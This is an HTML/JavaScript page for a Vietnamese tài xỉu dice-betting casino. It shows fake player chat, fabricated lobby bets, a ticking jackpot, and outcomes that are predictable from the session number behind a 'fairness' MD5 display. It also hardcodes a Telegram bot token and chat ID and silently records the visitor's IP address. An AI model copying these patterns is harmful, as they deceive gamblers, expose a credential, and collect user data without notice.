<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ROYAL CASINO - VIP MOBILE 2026</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <style>
        :root {
            --gold: #ffcc00; --gold-dark: #b8860b; --tai: #ffd84d; --xiu: #4fc3ff; --bg: #050505; --win: #ff0000;
            --chip-bg: linear-gradient(180deg, #332a22 0%, #110d0a 100%);
            --chip-border: #8e6d45; --glass: rgba(18, 18, 22, 0.98);
        }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; }
        body {
            margin: 0; background-color: var(--bg); color: #fff;
            font-family: 'Segoe UI', Roboto, sans-serif;
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
            background-image: radial-gradient(circle at center, #1a1a1a 0%, #000 100%);
            overflow: hidden;
        }

        /* HI·ªÜU ·ª®NG NH√ÅY ƒê·ªé TH·∫ÆNG */
        .win-blink { animation: blinkRed 0.4s infinite !important; border: 3px solid #ff0000 !important; box-shadow: 0 0 50px #ff0000 !important; z-index: 100; }
        @keyframes blinkRed { 0%, 100% { filter: brightness(1); } 50% { filter: brightness(2.5); transform: scale(1.02); } }

        .jackpot-shake { animation: shakeScreen 0.5s infinite; }
        @keyframes shakeScreen { 0%, 100% { transform: translate(0,0); } 10%, 30% { transform: translate(-5px,-5px); } 50%, 70% { transform: translate(5px, 5px); } }

        .container { display: flex; gap: 10px; width: 100vw; height: 100vh; padding: 8px; max-width: 1550px; }
        .side-col-chat { flex: 0 0 320px; display: flex; flex-direction: column; gap: 10px; }
        .side-col-bank { flex: 0 0 260px; display: flex; flex-direction: column; gap: 10px; }
        .main-col { flex: 1; display: flex; flex-direction: column; gap: 10px; }

        .glass-panel { background: var(--glass); border: 1.5px solid rgba(255, 204, 0, 0.2); border-radius: 20px; padding: 15px; display: flex; flex-direction: column; box-shadow: 0 10px 40px rgba(0,0,0,1); position: relative; }

        /* THANH CHAT VIP */
        .chat-box { flex: 1; overflow-y: auto; font-size: 14px; scroll-behavior: smooth; display: flex; flex-direction: column; gap: 10px; padding: 5px; }
        .chat-msg { animation: slideUp 0.3s ease; padding: 10px; border-radius: 12px; background: rgba(255,255,255,0.05); border-left: 4px solid var(--gold); }
        .chat-user { font-weight: 900; color: var(--gold); font-size: 12px; margin-bottom: 3px; display: block; }

        .jp-box { background: linear-gradient(180deg, #900, #300); border: 2px solid var(--gold); border-radius: 12px; padding: 8px; text-align: center; }
        .jp-value { font-size: clamp(30px, 4vw, 45px); color: #fff; font-family: 'Courier New', monospace; font-weight: bold; text-shadow: 0 0 20px #f00; }

        #timer { font-size: clamp(50px, 8vw, 80px); font-weight: 900; color: #fff; text-shadow: 0 0 35px var(--gold); text-align: center; margin: -5px 0; }
        
        .bowl-wrap { width: clamp(160px, 35vh, 220px); aspect-ratio: 1/1; margin: 0 auto; background: #000; border-radius: 50%; border: 10px solid #222; position: relative; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 50px rgba(255,204,0,0.2); }
        .lid { position: absolute; width: 102%; height: 102%; background: radial-gradient(circle at 35% 35%, #444, #000); border-radius: 50%; z-index: 10; cursor: pointer; transition: 0.7s; border: 1px solid #333; }
        .lid.open { transform: translate(140%, -100%) rotate(40deg); opacity: 0; }

        .dice { width: 45px; height: 45px; background: #fff; border-radius: 10px; color: #000; font-size: 28px; font-weight: bold; display: flex; justify-content: center; align-items: center; margin: 0 5px; box-shadow: 4px 4px 0 #999; }

        .bet-area { display: flex; gap: 12px; margin-top: 5px; }
        .bet-box { flex: 1; background: rgba(0,0,0,0.7); padding: 15px; border-radius: 18px; border: 3px solid #333; cursor: pointer; text-align: center; transition: 0.2s; }
        .bet-box.selected { border-color: var(--gold); background: rgba(255, 204, 0, 0.1); }
        .user-bet-val { color: #fff !important; font-size: clamp(20px, 3vw, 30px); font-weight: 900; text-shadow: 0 0 15px var(--gold); margin: 5px 0; }

        .chip-row { display: flex; justify-content: center; gap: 6px; margin-top: 15px; flex-wrap: wrap; }
        .chip { width: 70px; height: 48px; background: var(--chip-bg); border: 2px solid var(--chip-border); border-radius: 10px; display: flex; justify-content: center; align-items: center; font-weight: 900; color: #fbc531; font-size: 15px; cursor: pointer; }
        .chip:active { transform: scale(0.9); }

        /* N√öT SOI C·∫¶U M·ªöI */
        .roadmap-container { cursor: pointer; position: relative; border-radius: 12px; overflow: hidden; transition: 0.3s; }
        .roadmap-container:hover { filter: brightness(1.3); transform: scale(1.02); }
        .roadmap-label { color: var(--gold); font-size: 16px; font-weight: 900; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; }
        .roadmap-label span { font-size: 10px; background: var(--gold); color: #000; padding: 2px 6px; border-radius: 4px; animation: pulse 1s infinite; }

        /* MODAL BI·ªÇU ƒê·ªí */
        #chart-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 3000; width: 95%; max-width: 800px; background: #0c0c0f; border: 2px solid var(--gold); border-radius: 20px; padding: 15px; box-shadow: 0 0 100px #000; }

        .roadmap { background: #000; border: 1px solid #333; border-radius: 12px; height: 110px; display: grid; grid-template-rows: repeat(6, 1fr); grid-auto-flow: column; gap: 3px; padding: 8px; overflow-x: auto; }
        .dot { width: 14px; height: 14px; border-radius: 50%; box-shadow: inset -3px -3px 6px rgba(0,0,0,0.5); }
        .dot.tai { background: radial-gradient(circle at 30% 30%, #fff, var(--tai), #860); }
        .dot.xiu { background: radial-gradient(circle at 30% 30%, #fff, var(--xiu), #048); }

        #balance { color: var(--win); font-size: 24px; font-weight: bold; }
        .btn-dep { background: linear-gradient(180deg, #f1c40f, #d35400); color: #fff; border: none; padding: 12px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 10px; font-size: 16px; }
        .settings-btn { position: fixed; top: 15px; right: 15px; z-index: 1000; background: var(--gold); border: none; width: 35px; height: 35px; border-radius: 50%; cursor: pointer; font-size: 20px; }
        
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
    </style>
</head>
<body>

<button class="settings-btn" onclick="game.toggleSettings()">‚öôÔ∏è</button>
<div id="settings-modal" style="display:none; position:fixed; top:60px; right:15px; z-index:2000; width:180px; background:#111; border:2px solid var(--gold); border-radius:15px; padding:15px;">
    <h4 style="text-align:center; color:var(--gold); margin-bottom:10px; font-size:14px;">√ÇM THANH</h4>
    <div style="display:flex; justify-content:space-between; margin-bottom:10px; font-size:12px;"><span>Nh·∫°c n·ªÅn</span><input type="checkbox" id="bg-music-toggle" onchange="game.updateAudio()"></div>
    <div style="display:flex; justify-content:space-between; font-size:12px;"><span>Hi·ªáu ·ª©ng</span><input type="checkbox" id="sfx-toggle" checked onchange="game.updateAudio()"></div>
</div>

<div id="chart-modal">
    <div style="display:flex; justify-content:space-between; color:var(--gold); margin-bottom:10px;">
        <h2 style="font-size:18px;">üìä BI·ªÇU ƒê·ªí SOI C·∫¶U</h2>
        <b onclick="game.toggleChart()" style="cursor:pointer; font-size:24px;">&times;</b>
    </div>
    <div style="background:#111; border-radius:10px; padding:5px;"><canvas id="md5Chart" height="180"></canvas></div>
    <div style="background:#111; border-radius:10px; padding:5px; margin-top:10px;"><canvas id="diceChart" height="120"></canvas></div>
</div>

<audio id="m-bg" loop src="https://files.catbox.moe/v4cqzx.mp4"></audio>
<audio id="s-chip" src="https://files.catbox.moe/r2zy05.mp4"></audio>
<audio id="s-dice" loop src="https://files.catbox.moe/og6vqg.mp4"></audio>
<audio id="s-win" src="https://files.catbox.moe/vlwekr.mp4"></audio>
<audio id="s-jp" src="https://assets.mixkit.co/active_storage/sfx/2017/2017-preview.mp3"></audio>

<div class="container">
    <div class="side-col-chat glass-panel">
        <h3 style="color:var(--gold); font-size:16px; margin-bottom:10px; text-align:center;">üí¨ CHAT VIP</h3>
        <div class="chat-box" id="chat-box"></div>
        <div style="display:flex; gap:5px; margin-top:5px; background:#000; padding:5px; border-radius:8px;">
            <input type="text" id="chat-input" placeholder="Chat..." style="flex:1; background:transparent; border:none; color:#fff; font-size:12px; outline:none;">
            <button onclick="game.sendRealChat()" style="background:var(--gold); border:none; padding:4px 10px; border-radius:5px; font-weight:bold; cursor:pointer; font-size:11px;">G·ª¨I</button>
        </div>
    </div>

    <div class="main-col glass-panel">
        <div style="display:flex; justify-content:space-between; font-size:12px; color:rgba(255,255,255,0.5);">
            <span id="session-id">PHI√äN: #44230881</span><span>üî• JACKPOT üî•</span>
        </div>
        <div class="jp-box"><div class="jp-value" id="jp-val">5,000,000,000</div></div>
        <div id="timer">--</div>
        
        <div class="bowl-wrap">
            <div class="lid" id="lid" onclick="game.openLid()"></div>
            <div id="d1" class="dice">?</div><div id="d2" class="dice">?</div><div id="d3" class="dice">?</div>
        </div>
        
        <div class="bet-area">
            <div class="bet-box selected" id="box-tai" onclick="game.selectSide('TAI')">
                <h2 style="color:var(--tai); font-size:22px;">T√ÄI</h2><div id="u-tai" class="user-bet-val">0</div>
                <div style="font-size:10px; color:#666">S·∫£nh: <span id="t-tai" style="color:var(--gold)">0</span></div>
            </div>
            <div class="bet-box" id="box-xiu" onclick="game.selectSide('XIU')">
                <h2 style="color:var(--xiu); font-size:22px;">X·ªàU</h2><div id="u-xiu" class="user-bet-val">0</div>
                <div style="font-size:10px; color:#666">S·∫£nh: <span id="t-xiu" style="color:var(--gold)">0</span></div>
            </div>
        </div>
        <div class="chip-row">
            <div class="chip" onclick="game.addBet(5000000)">5M</div>
            <div class="chip" onclick="game.addBet(10000000)">10M</div>
            <div class="chip" onclick="game.addBet(50000000)">50M</div>
            <div class="chip" onclick="game.addBet(100000000)">100M</div>
            <div class="chip" onclick="game.allIn()" style="background:var(--win); color:#fff; border-color:#fff;">ALL IN</div>
            <button onclick="game.clearBet()" style="background:#222; color:#aaa; border:none; border-radius:10px; padding:0 15px; cursor:pointer; font-weight:bold; font-size:11px;">X√ìA</button>
        </div>
    </div>

    <div class="side-col-bank glass-panel">
        <div>
            <h3 style="color:var(--gold); font-size:16px;">üè¶ BANK</h3>
            <b id="balance">0</b>
            <input type="number" id="inp-dep" placeholder="N·∫°p..." style="width:100%; padding:10px; background:#000; border:1px solid #333; color:#fff; border-radius:8px; text-align:center; margin-top:5px;">
            <button id="btn-dep" class="btn-dep" onclick="game.deposit()">N·∫†P TI·ªÄN</button>
        </div>
        <div style="flex:1; margin-top:15px;" class="roadmap-container" onclick="game.toggleChart()">
            <div class="roadmap-label">SOI C·∫¶U <span>XEM BI·ªÇU ƒê·ªí</span></div>
            <div class="roadmap" id="roadmap"></div>
        </div>
    </div>
</div>

<script>
class CasinoMaster {
    constructor() {
        this.balance = parseInt(localStorage.getItem('casino_balance')) || 400000000;
        this.jackpot = 25125000000;
        this.state = 'BET'; this.side = null;
        this.bT = 0; this.bX = 0; this.fT = 0; this.fX = 0;
        this.roundDur = 40; this.userIP = "Unknown";
        this.history = []; this.baseSession = 44230881;
        this.teleToken = "8537807711:AAGhZcmt5-54vFRoY4OxGT06XvRmkkwvutg"; 
        this.teleChatId = "-1003672099430";
        this.init(); this.getIP(); this.runLiveBets(); this.runJackpotTimer(); this.startFakeChatSystem();
    }

    async getIP() { try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); this.userIP = d.ip; } catch (e) { } }
    saveData() { localStorage.setItem('casino_balance', this.balance); }
    toggleSettings() { const m = document.getElementById('settings-modal'); m.style.display = m.style.display === 'block' ? 'none' : 'block'; }
    updateAudio() { const bgm = document.getElementById('m-bg'); if(document.getElementById('bg-music-toggle').checked) { bgm.volume=0.3; bgm.play().catch(()=>{}); } else bgm.pause(); }
    playSound(id, l=false) { if(document.getElementById('sfx-toggle').checked){ const e=document.getElementById(id); if(e){ e.currentTime=0; e.loop=l; e.play().catch(()=>{}); } } }

    getSeedResult(s) {
        const rand = (Math.abs(Math.sin(s) * 10000)) % 1;
        const isJp = rand < 0.05; 
        let d = isJp ? (rand < 0.025 ? [1,1,1] : [6,6,6]) : [Math.floor((rand*13)%6)+1, Math.floor((rand*131)%6)+1, Math.floor((rand*1313)%6)+1];
        if(!isJp && d[0]===d[1] && d[1]===d[2]) d[0] = d[0]===6?1:d[0]+1;
        const sum = d[0]+d[1]+d[2];
        const win = sum >= 11 ? 'TAI' : 'XIU';
        const md5 = CryptoJS.MD5(`PHIEN_${s}:${d.join('-')}:${win}:VIP`).toString();
        return { s, d, sum, win, isJp, md5 };
    }

    init() { 
        const currentSession = this.baseSession + Math.floor(Date.now()/1000/this.roundDur);
        for(let i=30; i>0; i--) { this.history.push(this.getSeedResult(currentSession - i)); }
        setInterval(() => this.loop(), 1000); this.updateUI(); 
    }
    
    loop() {
        const now = Math.floor(Date.now() / 1000);
        const cycle = now % this.roundDur;
        const session = this.baseSession + Math.floor(now / this.roundDur);
        document.getElementById('session-id').innerText = "PHI√äN: #" + session;

        if (cycle < 25) { 
            if (this.state !== 'BET') this.resetRound();
            this.state = 'BET'; this.timer = 25 - cycle; document.getElementById('timer').innerText = this.timer;
        } else if (cycle < 35) {
            if (this.state === 'BET') {
                this.state = 'WAIT'; this.currentRes = this.getSeedResult(session);
                this.history.push(this.currentRes); if(this.history.length > 50) this.history.shift();
            }
            if (cycle === 34 && !document.getElementById('lid').classList.contains('open')) this.openLid();
            document.getElementById('timer').innerText = "!";
        } else { this.state = 'RESULT'; document.getElementById('timer').innerText = "WAIT"; }
        this.syncHistory();
    }

    payout() {
        const r = this.currentRes;
        document.getElementById('d1').innerText = r.d[0]; document.getElementById('d2').innerText = r.d[1]; document.getElementById('d3').innerText = r.d[2];
        let userWinReal = 0;

        if(r.isJp) {
            this.playSound('s-jp'); document.body.classList.add('jackpot-shake');
            confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
            const totalInSide = (r.win === 'TAI') ? (this.fT + this.bT) : (this.fX + this.bX);
            const userBet = (r.win === 'TAI') ? this.bT : this.bX;
            if(userBet > 0) { 
                userWinReal = Math.floor((userBet / totalInSide) * this.jackpot); this.balance += userWinReal; 
                document.getElementById(this.side === 'TAI' ? 'box-tai' : 'box-xiu').classList.add('win-blink');
            }
            this.jackpot = 100000000;
            setTimeout(() => { document.body.classList.remove('jackpot-shake'); }, 5000);
        } else {
            if (this.side === r.win) {
                const bet = (this.side === 'TAI' ? this.bT : this.bX);
                userWinReal = Math.floor(bet * 1.9); 
                this.balance += userWinReal; this.playSound('s-win');
                const winBox = document.getElementById(this.side === 'TAI' ? 'box-tai' : 'box-xiu');
                winBox.classList.add('win-blink');
                setTimeout(() => winBox.classList.remove('win-blink'), 5000);
            }
        }
        this.saveData(); this.updateUI();
    }

    sendRealChat() { const i = document.getElementById('chat-input'); if(i.value.trim()){ this.logChat("B·∫†N", i.value, "#00ff00"); i.value=""; } }
    logChat(u, m, c) {
        const d = document.createElement('div'); d.className='chat-msg';
        d.innerHTML = `<span class="chat-user" style="color:${c||'var(--gold)'}">${u}:</span> ${m}`;
        const b = document.getElementById('chat-box'); b.appendChild(d);
        if(b.children.length>40) b.removeChild(b.firstChild); b.scrollTop=b.scrollHeight;
    }

    startFakeChatSystem() {
        const u = ["Huy VIP","Th√°nh Soi","Ho√†ng B√©","Lan Pro"];
        const ms = { bet: ["T√†i ch·∫Øc","X·ªâu ƒëi ae","N·∫∑n ph√™ qu√°"], wait: ["M·ªü ƒëi admin","H·ªìi h·ªôp vcl"], res: ["B·ªãp qu√°","H√∫p r th∆°m","L·∫°i gi√†u"] };
        setInterval(() => { if (Math.random() > 0.5) { let p = (this.state==='BET'?ms.bet:(this.state==='RESULT'?ms.res:ms.wait)); this.logChat(u[Math.floor(Math.random()*u.length)], p[Math.floor(Math.random()*p.length)]); } }, 3000);
    }

    openLid() { if(this.state === 'WAIT') { document.getElementById('lid').classList.add('open'); this.state='ANIM'; let c=0; let si=setInterval(()=>{ document.getElementById('d1').innerText=Math.floor(Math.random()*6)+1; document.getElementById('d2').innerText=Math.floor(Math.random()*6)+1; document.getElementById('d3').innerText=Math.floor(Math.random()*6)+1; if(++c>15){ clearInterval(si); this.payout(); } },80); } }
    toggleChart() { const m = document.getElementById('chart-modal'); m.style.display = m.style.display === 'block' ? 'none' : 'block'; if(m.style.display === 'block') this.drawCharts(); }
    drawCharts() {
        const last20 = this.history.slice(-20); const labels = last20.map(h => h.s.toString().slice(-4));
        if(this.md5Chart) this.md5Chart.destroy(); if(this.diceChart) this.diceChart.destroy();
        const ctx1 = document.getElementById('md5Chart').getContext('2d');
        this.md5Chart = new Chart(ctx1, { type: 'line', data: { labels, datasets: [{ data: last20.map(h=>h.sum), borderColor: '#ffcc00', borderWidth: 4, tension: 0.1, pointRadius: 6, pointBackgroundColor: '#fff', fill: true, backgroundColor: 'rgba(255, 204, 0, 0.05)' }]}, options: { scales: { y: { min: 3, max: 18, grid: { display: false }, ticks: { color: '#fff' } }, x: { grid: { display: false }, ticks: { color: '#fff' } } }, plugins: { legend: { display: false } } } });
        const ctx2 = document.getElementById('diceChart').getContext('2d');
        this.diceChart = new Chart(ctx2, { type: 'line', data: { labels, datasets: [{ label: 'V1', data: last20.map(h=>h.d[0]), borderColor: '#f0f', tension: 0.1, pointRadius: 3 }, { label: 'V2', data: last20.map(h=>h.d[1]), borderColor: '#ff0', tension: 0.1, pointRadius: 3 }, { label: 'V3', data: last20.map(h=>h.d[2]), borderColor: '#0ff', tension: 0.1, pointRadius: 3 }]}, options: { scales: { y: { min: 1, max: 6, grid: { color: '#222' }, ticks: { color: '#888' } }, x: { grid: { display: false }, ticks: { color: '#888' } } }, plugins: { legend: { labels: { color: '#888' } } } } });
    }
    deposit() { let a = parseInt(document.getElementById('inp-dep').value); if(a>0){ this.balance += Math.min(a, 10000000000); this.saveData(); this.updateUI(); } }
    addBet(m) { if(this.timer > 3 && this.side !== null && this.balance >= m) { this.playSound('s-chip'); if(this.side === 'TAI') this.bT += m; else this.bX += m; this.balance -= m; this.updateUI(); } }
    updateUI() { document.getElementById('balance').innerText = this.balance.toLocaleString(); document.getElementById('u-tai').innerText = this.bT.toLocaleString(); document.getElementById('u-xiu').innerText = this.bX.toLocaleString(); document.getElementById('box-tai').classList.toggle('selected', this.side==='TAI'); document.getElementById('box-xiu').classList.toggle('selected', this.side==='XIU'); if(this.bT>0) document.getElementById('box-xiu').classList.add('disabled-side'); if(this.bX>0) document.getElementById('box-tai').classList.add('disabled-side'); }
    resetRound() { this.bT=0; this.bX=0; this.fT=0; this.fX=0; this.side=null; document.getElementById('lid').classList.remove('open'); document.getElementById('box-tai').classList.remove('disabled-side', 'win-blink'); document.getElementById('box-xiu').classList.remove('disabled-side', 'win-blink'); document.getElementById('d1').innerText="?"; document.getElementById('d2').innerText="?"; document.getElementById('d3').innerText="?"; this.updateUI(); }
    syncHistory() { let h=""; this.history.slice(-30).reverse().forEach(r => { h+=`<div class="dot ${r.win.toLowerCase()}"></div>`; }); document.getElementById('roadmap').innerHTML=h; }
    allIn() { this.addBet(this.balance); }
    clearBet() { if(this.state==='BET'){ this.balance+=(this.bT+this.bX); this.bT=0; this.bX=0; this.side=null; this.updateUI(); }}
    selectSide(s) { if(this.state==='BET'&&(this.side===null||this.side===s)){ this.side=s; this.updateUI(); }}
    runJackpotTimer() { setInterval(() => { if(this.jackpot > 0) this.jackpot += Math.floor(Math.random() * 5000); document.getElementById('jp-val').innerText = Math.floor(this.jackpot).toLocaleString(); }, 150); }
    runLiveBets() { setInterval(() => { if(this.state === 'BET') { this.fT += Math.floor(Math.random()*100000000); this.fX += Math.floor(Math.random()*100000000); document.getElementById('t-tai').innerText = (this.fT+this.bT).toLocaleString(); document.getElementById('t-xiu').innerText = (this.fX+this.bX).toLocaleString(); } }, 400); }
}
const game = new CasinoMaster();
</script>
</body>
</html>
